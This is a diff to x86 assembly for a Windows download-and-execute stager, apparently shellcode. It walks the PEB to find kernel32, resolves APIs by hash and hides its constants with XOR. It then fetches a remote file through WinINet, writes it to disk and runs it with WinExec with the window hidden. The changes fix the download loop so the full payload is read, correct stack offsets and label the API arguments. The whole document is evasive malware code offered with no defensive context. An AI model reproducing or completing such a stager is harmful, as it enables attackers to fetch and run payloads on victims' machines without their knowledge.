@@ -137,7 +137,7 @@ main:
     mov  ebp, esp
     xor  ecx, ecx
     mov  ecx, 0x01010301
-    xor  ecx, 0x01010201
+    xor  ecx, 0x01010101
     sub  esp, ecx
 
     ; Bootstrap: find kernel32 via PEB walk
@@ -153,10 +153,10 @@ main:
     call resolve_export_by_hash
     mov  [ebp-0x28], eax
 
-    ; VirtualAlloc  [ebp-0x34]
+    ; VirtualAlloc  [ebp-0x3c]
     mov  eax, 0x91afca54
     call resolve_export_by_hash
-    mov  [ebp-0x34], eax
+    mov  [ebp-0x3c], eax
 
     ; CreateFileA  [ebp-0x40]
     mov  eax, 0x7d0116a4
@@ -219,15 +219,15 @@ main:
     call resolve_export_by_hash
     mov  [ebp-0x30], eax
 
-    ; InternetReadFile  [ebp-0x38]
+    ; InternetReadFile  [ebp-0x34]
     mov  eax, 0x5fe34b8b
     call resolve_export_by_hash
-    mov  [ebp-0x38], eax
+    mov  [ebp-0x34], eax
 
-    ; InternetCloseHandle  [ebp-0x3c]
+    ; InternetCloseHandle  [ebp-0x38]
     mov  eax, 0xfa9b69c7
     call resolve_export_by_hash
-    mov  [ebp-0x3c], eax
+    mov  [ebp-0x38], eax
 
 ; -- String Construction --
 
@@ -298,128 +298,155 @@ wf_hang_1:
 
 wf_entry:
 
-    ; InternetOpenA
+    ; InternetOpenA(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags)
     xor  eax, eax
-    push eax                      ; arg4
+    push eax                      ; dwFlags
     xor  eax, eax
-    push eax                      ; arg3
+    push eax                      ; lpszProxyBypass
     xor  eax, eax
-    push eax                      ; arg2
+    push eax                      ; lpszProxy
     mov  eax, 0x01010103
     xor  eax, 0x01010102
-    push eax                      ; arg1
-    lea  eax, [ebp-0x8c]
-    push eax                      ; arg0
+    push eax                      ; dwAccessType
+    lea  eax, [ebp-0x10c]
+    push eax                      ; lpszAgent
     call dword ptr [ebp-0x2c]
-    mov  [ebp-0x5c], eax
+    mov  [ebp-0x60], eax
     ; -> inet_session
-    mov  eax, [ebp-0x5c]
+    mov  eax, [ebp-0x60]
     test eax, eax
     jnz  wf_open_url
     jmp  wf_fail
 
 wf_open_url:
 
-    ; InternetOpenUrlA
+    ; InternetOpenUrlA(hInternet, lpszUrl, lpszHeaders, dwHeadersLength, dwFlags, dwContext)
     xor  eax, eax
-    push eax                      ; arg5
+    push eax                      ; dwContext
     xor  eax, eax
-    push eax                      ; arg4
+    push eax                      ; dwFlags
     xor  eax, eax
-    push eax                      ; arg3
+    push eax                      ; dwHeadersLength
     xor  eax, eax
-    push eax                      ; arg2
-    lea  eax, [ebp-0xb0]
-    push eax                      ; arg1
-    mov  eax, [ebp-0x5c]
-    push eax                      ; arg0
-    call dword ptr [ebp-0x30]
-    mov  [ebp-0x60], eax
-    ; -> inet_url
+    push eax                      ; lpszHeaders
+    lea  eax, [ebp-0x130]
+    push eax                      ; lpszUrl
     mov  eax, [ebp-0x60]
+    push eax                      ; hInternet
+    call dword ptr [ebp-0x30]
+    mov  [ebp-0x64], eax
+    ; -> inet_url
+    mov  eax, [ebp-0x64]
     test eax, eax
     jnz  wf_alloc_buffer
     jmp  wf_fail
 
 wf_alloc_buffer:
 
-    ; VirtualAlloc
+    ; VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
     mov  eax, 0x01010105
     xor  eax, 0x01010101
-    push eax                      ; arg3
+    push eax                      ; flProtect
     mov  eax, 0x01013101
     xor  eax, 0x01010101
-    push eax                      ; arg2
+    push eax                      ; flAllocationType
     mov  eax, 0x01110101
     xor  eax, 0x01010101
-    push eax                      ; arg1
+    push eax                      ; dwSize
     xor  eax, eax
-    push eax                      ; arg0
-    call dword ptr [ebp-0x34]
-    mov  [ebp-0x64], eax
+    push eax                      ; lpAddress
+    call dword ptr [ebp-0x3c]
+    mov  [ebp-0x68], eax
     ; -> virt_buf
-    mov  eax, [ebp-0x64]
+    mov  eax, [ebp-0x68]
     test eax, eax
-    jnz  wf_read_loop
+    jnz  wf_init_read
     jmp  wf_fail
+
+wf_init_read:
+    ; bytes_total = ...
+    xor  eax, eax
+    mov  [ebp-0x54], eax
+    jmp  wf_read_loop
 
 wf_read_loop:
+    ; buf_ptr = ... add ...
+    mov  eax, [ebp-0x68]
+    mov  ecx, eax
+    mov  eax, [ebp-0x54]
+    add  ecx, eax
+    mov  [ebp-0x5c], ecx
 
-    ; InternetReadFile
+    ; InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead)
     lea  eax, [ebp-0x58]
-    push eax                      ; arg3
+    push eax                      ; lpdwNumberOfBytesRead
     mov  eax, 0x01110101
     xor  eax, 0x01010101
-    push eax                      ; arg2
+    push eax                      ; dwNumberOfBytesToRead
+    mov  eax, [ebp-0x5c]
+    push eax                      ; lpBuffer
     mov  eax, [ebp-0x64]
-    push eax                      ; arg1
-    mov  eax, [ebp-0x60]
-    push eax                      ; arg0
-    call dword ptr [ebp-0x38]
-    mov  [ebp-0x68], eax
-    ; -> read_ret
+    push eax                      ; hFile
+    call dword ptr [ebp-0x34]
+    mov  [ebp-0x6c], eax
+    ; -> irf_ret
+    mov  eax, [ebp-0x6c]
+    test eax, eax
+    jnz  wf_check_eof
+    jmp  wf_read_done
+
+wf_check_eof:
     mov  eax, [ebp-0x58]
     test eax, eax
-    jnz  wf_close_handles
-    jmp  wf_fail
+    jnz  wf_accumulate
+    jmp  wf_read_done
 
-wf_close_handles:
+wf_accumulate:
+    ; bytes_total = ... add ...
+    mov  eax, [ebp-0x54]
+    mov  ecx, eax
+    mov  eax, [ebp-0x58]
+    add  ecx, eax
+    mov  [ebp-0x54], ecx
+    jmp  wf_read_loop
 
-    ; InternetCloseHandle
+wf_read_done:
+
+    ; InternetCloseHandle(hInternet)
+    mov  eax, [ebp-0x64]
+    push eax                      ; hInternet
+    call dword ptr [ebp-0x38]
+
+    ; InternetCloseHandle(hInternet)
     mov  eax, [ebp-0x60]
-    push eax                      ; arg0
-    call dword ptr [ebp-0x3c]
-
-    ; InternetCloseHandle
-    mov  eax, [ebp-0x5c]
-    push eax                      ; arg0
-    call dword ptr [ebp-0x3c]
+    push eax                      ; hInternet
+    call dword ptr [ebp-0x38]
     jmp  wf_write_file
 
 wf_write_file:
 
-    ; CreateFileA
+    ; CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile)
     xor  eax, eax
-    push eax                      ; arg6
+    push eax                      ; hTemplateFile
     mov  eax, 0x01010181
     xor  eax, 0x01010101
-    push eax                      ; arg5
+    push eax                      ; dwFlagsAndAttributes
     mov  eax, 0x01010103
     xor  eax, 0x01010101
-    push eax                      ; arg4
+    push eax                      ; dwCreationDisposition
     xor  eax, eax
-    push eax                      ; arg3
+    push eax                      ; lpSecurityAttributes
     xor  eax, eax
-    push eax                      ; arg2
+    push eax                      ; dwShareMode
     mov  eax, 0x41010101
     xor  eax, 0x01010101
-    push eax                      ; arg1
-    lea  eax, [ebp-0xbc]
-    push eax                      ; arg0
+    push eax                      ; dwDesiredAccess
+    lea  eax, [ebp-0x13c]
+    push eax                      ; lpFileName
     call dword ptr [ebp-0x40]
-    mov  [ebp-0x6c], eax
+    mov  [ebp-0x70], eax
     ; -> file_handle
-    mov  eax, [ebp-0x6c]
+    mov  eax, [ebp-0x70]
     mov  ecx, 0xffffffff
     cmp  eax, ecx
     jne  wf_do_write
@@ -427,22 +454,24 @@ wf_write_file:
 
 wf_do_write:
 
-    ; WriteFile
+    ; WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped)
     xor  eax, eax
-    push eax                      ; arg4
-    lea  eax, [ebp-0x54]
-    push eax                      ; arg3
-    mov  eax, [ebp-0x58]
-    push eax                      ; arg2
-    mov  eax, [ebp-0x64]
-    push eax                      ; arg1
-    mov  eax, [ebp-0x6c]
-    push eax                      ; arg0
+    push eax                      ; lpOverlapped
+    lea  eax, [ebp-0x58]
+    push eax                      ; lpNumberOfBytesWritten
+    mov  eax, [ebp-0x54]
+    push eax                      ; nNumberOfBytesToWrite
+    mov  eax, [ebp-0x68]
+    push eax                      ; lpBuffer
+    mov  eax, [ebp-0x70]
+    push eax                      ; hFile
     call dword ptr [ebp-0x44]
+    mov  [ebp-0x74], eax
+    ; -> write_ret
 
-    ; CloseHandle
-    mov  eax, [ebp-0x6c]
-    push eax                      ; arg0
+    ; CloseHandle(hObject)
+    mov  eax, [ebp-0x70]
+    push eax                      ; hObject
     call dword ptr [ebp-0x48]
     jmp  wf_exec_payload
 
@@ -451,12 +480,12 @@ wf_exec_payload:
     ; WinExec(lpCmdLine, uCmdShow)
     xor  eax, eax
     push eax                      ; uCmdShow
-    lea  eax, [ebp-0xbc]
+    lea  eax, [ebp-0x13c]
     push eax                      ; lpCmdLine
     call dword ptr [ebp-0x4c]
-    mov  [ebp-0x70], eax
+    mov  [ebp-0x78], eax
     ; -> exec_ret
-    mov  eax, [ebp-0x70]
+    mov  eax, [ebp-0x78]
     test eax, eax
     jnz  wf_success
     jmp  wf_fail
